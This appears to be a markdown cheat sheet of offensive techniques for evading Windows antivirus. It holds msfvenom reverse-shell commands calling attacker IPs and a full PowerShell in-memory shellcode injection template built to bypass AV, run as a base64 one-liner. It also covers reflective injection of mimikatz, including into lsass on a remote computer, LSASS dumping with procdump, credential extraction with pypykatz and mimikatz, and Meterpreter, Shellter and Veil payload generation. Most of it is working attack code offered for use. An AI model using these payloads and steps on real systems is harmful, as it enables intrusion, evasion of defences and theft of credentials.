# AV Evasion in Practice

## Windows PE Analysing

* Use msfvenom Reverse Shell
* VirusTotal Upload `https://www.virustotal.com/gui/home/upload`
* Antiscan Me `https://antiscan.me` (4 Uploads/ Day)

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe
```

## UPX

* Packer for executeables
* ` https://upx.github.io/`

```bash
sudo apt install upx-ucl
```

## Obfuscator

* EnigmaProtector
* Comercial Tool `https://www.enigmaprotector.com/en/home.html`

## Powershell AV ByPass Techniques

* **Limitation**: Powershell x86
* Use Powershell x86 Template Script
* Implant Reverse-Shell with In-Memory-Injection (VirtualAlloc, memset, CreateThread)
  * Use Msfvenom to create a reverse shell -f powershell
  * Add Shellcode `<place your shellcode here>`
  * Modify $var to obfuscate the malicous code
* Make Powershell Onliner `https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py`
* Set `Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser`
* Run Powerhell Script to spawn Reverse Shell without AV Evasion

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.192 LPORT=443 -f powershell
```

```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$windoof = 
  Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$shellcode = #<place your shellcode here>; 

$size = 0x1000;

if ($shellcode.Length -gt 0x1000) {$size = $shellcode.Length};

$x = $windoof::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($shellcode.Length-1);$i++) {$windoof::memset([IntPtr]($x.ToInt32()+$i), $shellcode[$i], 1)};

$windoof::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

```bash
python3 tools/ps-encode.py --script tools/av-bypass-resershell.ps1
JABjAG8AZABlACAAPQAgACcACgBbAEQAbABsAEkAbQBwAG8...
```

```powershell
# Run ps1
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
./av-bypass-resershell.ps1
# Alternative base64 encode ps1
powershell -enc  JABjAG8AZABlACAAPQAgACcACgBbAEQAbABsAEkAbQBwAG8...
```

## Powersploit AV ByPass Techniques (Not working)

* Inject EXE or DLL into powershell
* Use [Powersploit Invoke-ReflectivePEInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1)

Load Mimikatz.exe and run it locally. Forces ASLR on for the EXE.

```powershell
# Attack
# Read mimikatz into bytes and convert into Base64 string
$PEBytes = [IO.File]::ReadAllBytes('mimikatz.exe')
$Base64s = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($PEBytes))
# Victim
# Load mimikatz and run it within powershell
$PEBytes = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($Base64s)) 
Import-Module .\Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "" -ForceASLR
```

Refectively load DemoDLL_RemoteProcess.dll in to the lsass process on a remote computer.

```powershell
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL_RemoteProcess.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcName lsass -ComputerName Target.Local
```

## Dump LSASS with Sysinternal ProcDump AV ByPass

* **Limitation**: Requires SeDebugPrivilege
* Use [Sysinternal Proddump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump)
* Use Mimikatz to dump hashes
* From [dumping-lsass](https://blog.cyberadvisors.com/technical-blog/attacks-defenses-dumping-lsass-no-mimikatz/)

```powershell
# Victim
# Dump hashes cached in LSASS memory
tasklist | findstr lsass
# or
get-process lsass
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1296      26     7148      51752               580   0 lsass
procdump.exe -accepteula -ma 580 lsass.dmp

# Attacker
# Load dumped logon passwords
pypykatz lsa minidump lsass.DMP

# or mimikatz
sekurlsa::minidump lsass.dmp
log lsass.txt
sekurlsa::logonPasswords
```

## Automate AV Evasion with Shellter x86

* **Limitation**: Require x86, 32bit windows only
* Windows Tool Download `https://www.shellterproject.com/download/
* Use Meterpreter Reverse Shell Handler


```bash
# Kali
sudo apt install shellter
```

```bash
# Meterpreter 
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
meterpreter > shell
```

## Automate AV Evasion with Veil Framework

* **Limitation**: Require x86

```bash
$ veil -t Evasion -p go/meterpreter/rev_tcp.py --ip 127.0.0.1 --port 4444
```
